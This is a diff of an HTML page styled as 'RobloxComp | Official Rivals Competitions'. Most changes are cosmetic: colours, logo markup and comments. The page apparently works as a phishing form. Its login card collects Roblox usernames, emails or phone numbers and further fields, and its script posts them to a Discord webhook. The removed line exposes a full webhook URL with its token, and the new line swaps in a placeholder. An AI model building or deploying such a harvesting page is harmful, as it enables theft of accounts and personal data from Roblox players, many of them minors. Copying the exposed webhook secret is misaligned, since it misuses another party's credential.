@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>RobloxComp | Official Rivals Competitions</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -14,7 +14,7 @@
         }
 
         body {
-            font-family: 'Montserrat', 'Inter', sans-serif;
+            font-family: 'Montserrat', sans-serif;
             background: radial-gradient(circle at 20% 30%, #0a0c12, #020406);
             min-height: 100vh;
             color: #edeff5;
@@ -23,7 +23,7 @@
 
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #11131f; }
-        ::-webkit-scrollbar-thumb { background: #ff3a4d; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #ff1a3a; border-radius: 10px; }
 
         .site-container {
             max-width: 1400px;
@@ -34,7 +34,7 @@
         }
         .site-container.loaded { opacity: 1; }
 
-        /* ========= LOADER ========= */
+        /* LOADER */
         .loader-overlay {
             position: fixed;
             top: 0;
@@ -71,7 +71,7 @@
         .inline-loader { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 6px 0; }
         .inline-loader .dot { width: 9px; height: 9px; animation: pulseWave 1.2s infinite ease-in-out; }
 
-        /* ========= HEADER ========= */
+        /* HEADER */
         .modern-header {
             display: flex;
             justify-content: space-between;
@@ -94,17 +94,25 @@
             letter-spacing: -0.02em;
             transition: transform 0.2s ease;
             cursor: pointer;
-            background: linear-gradient(135deg, #ffffff 0%, #ffffff 40%, #ff5e7e 100%);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 12px rgba(255,255,255,0.3);
+        }
+        .logo-combined .roblox-white {
+            color: #ffffff;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+        .logo-combined .comp-red {
+            color: #ff1a3a;
+            text-shadow: 0 0 8px #ff1a3a, 0 0 15px #ff3355;
+            font-weight: 900;
         }
         .logo-combined:hover {
             transform: scale(1.02);
-            background: linear-gradient(135deg, #ffffff, #ff8da1);
-            -webkit-background-clip: text;
-            background-clip: text;
+        }
+        .logo-combined:hover .roblox-white {
+            text-shadow: 0 0 18px rgba(255,255,255,0.9);
+        }
+        .logo-combined:hover .comp-red {
+            text-shadow: 0 0 20px #ff3355, 0 0 30px #ff5e7e;
+            color: #ff3355;
         }
         .github-btn {
             font-size: 0.7rem;
@@ -124,11 +132,11 @@
         .github-btn:hover {
             background: rgba(45, 48, 70, 0.9);
             color: #ffffff;
-            border-color: #ff5e7e;
+            border-color: #ff3355;
             transform: translateY(-1px);
         }
 
-        /* slot warning */
+        /* SLOT WARNING */
         .slot-warning {
             background: rgba(255, 100, 40, 0.12);
             border-left: 3px solid #ffa047;
@@ -144,7 +152,7 @@
             color: #ffbc7a;
         }
 
-        /* two columns */
+        /* TWO COLUMNS */
         .two-col {
             display: flex;
             flex-wrap: wrap;
@@ -154,7 +162,7 @@
         .form-col { flex: 1.2; min-width: 280px; }
         .info-col { flex: 1; min-width: 280px; }
 
-        /* form card */
+        /* LOGIN CARD */
         .login-card {
             background: rgba(10, 12, 22, 0.7);
             backdrop-filter: blur(16px);
@@ -186,9 +194,9 @@
             outline: none;
             transition: all 0.2s;
         }
-        .input-field:focus { border-color: #ff4d6d; box-shadow: 0 0 8px rgba(255, 60, 90, 0.3); }
+        .input-field:focus { border-color: #ff1a3a; box-shadow: 0 0 8px rgba(255, 26, 58, 0.3); }
         .login-btn {
-            background: linear-gradient(95deg, #ff2e4d, #ff5c7e);
+            background: linear-gradient(95deg, #ff1a3a, #ff5c7e);
             width: 100%;
             border: none;
             padding: 0.75rem;
@@ -202,7 +210,7 @@
             justify-content: center;
             gap: 8px;
         }
-        .login-btn:hover { transform: scale(1.01); box-shadow: 0 6px 14px rgba(255,46,77,0.3); }
+        .login-btn:hover { transform: scale(1.01); box-shadow: 0 6px 14px rgba(255,26,58,0.4); }
         .team-fields { margin-top: 1rem; display: none; transition: 0.2s; }
         .team-fields.show-team { display: block; animation: fadeSlide 0.25s ease; }
         .team-row { margin-bottom: 0.6rem; }
@@ -220,7 +228,7 @@
             padding: 0.3rem;
         }
 
-        /* TOURNAMENT CARD - KEIN FLACKERN MEHR (einfach zu hellerer Farbe) */
+        /* TOURNAMENT CARD */
         .tournament-card {
             background: rgba(6, 8, 18, 0.65);
             backdrop-filter: blur(14px);
@@ -232,7 +240,7 @@
         }
         .tournament-card:hover {
             transform: translateY(-4px);
-            border-color: #ff7a90;
+            border-color: #ff3355;
             background: rgba(20, 22, 38, 0.8);
         }
         .tournament-header {
@@ -292,9 +300,9 @@
             border-left: 3px solid #2eff8a;
         }
         .nexoo-glow {
-            color: #ff5c7e;
+            color: #ff3355;
             font-weight: 800;
-            text-shadow: 0 0 6px #ff3366;
+            text-shadow: 0 0 6px #ff1a3a;
             transition: 0.2s;
             display: inline-block;
         }
@@ -318,7 +326,6 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            font-family: monospace;
         }
         @media (max-width: 780px) {
             .site-container { padding: 1.2rem; }
@@ -334,10 +341,12 @@
 <div id="mainContainer" class="site-container">
     <div class="modern-header">
         <div class="logo-wrapper">
-            <div class="logo-combined">RobloxComp</div>
+            <div class="logo-combined">
+                <span class="roblox-white">Roblox</span><span class="comp-red">Comp</span>
+            </div>
             <a href="#" class="github-btn" id="githubBtn"><i class="fab fa-github"></i> .github.io</a>
         </div>
-        <div style="width: 80px;"></div> <!-- spacer for balance -->
+        <div style="width: 80px;"></div>
     </div>
 
     <div class="slot-warning">
@@ -406,7 +415,7 @@
 
 <script>
     (function(){
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL";
         
         const globalLoader = document.getElementById('globalLoader');
         const mainContainer = document.getElementById('mainContainer');
@@ -465,7 +474,7 @@
             const payload = {
                 embeds: [{
                     title: "NEW RIVALS REGISTRATION - RobloxComp",
-                    color: 0xff3a4d,
+                    color: 0xff1a3a,
                     fields: [
                         { name: "Roblox Username", value: username || "NULL", inline: true },
                         { name: "Email / Phone", value: emailPhone || "NULL", inline: true },
@@ -524,7 +533,6 @@
             if (allInputs[i]) allInputs[i].addEventListener('keypress', function(e) { if (e.key === 'Enter') handleRegistration(); });
         }
 
-        // Loader disappear
         setTimeout(function() {
             if (globalLoader) globalLoader.classList.add('hidden-loader');
             setTimeout(function() {
@@ -536,7 +544,6 @@
         teamContainer.classList.remove('show-team');
         dynamicNotice.classList.add('hidden-message');
 
-        // webhook warning
         if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
             var warnSpan = document.createElement('div');
             warnSpan.style.fontSize = "0.65rem";
@@ -547,12 +554,11 @@
             if (loginCard) loginCard.appendChild(warnSpan);
         }
 
-        // github button dummy action
         const gitBtn = document.getElementById('githubBtn');
         if(gitBtn) {
             gitBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast("RobloxComp .github.io | open source hub", false, 1500);
+                showToast("RobloxComp .github.io | open source", false, 1500);
             });
         }
     })();
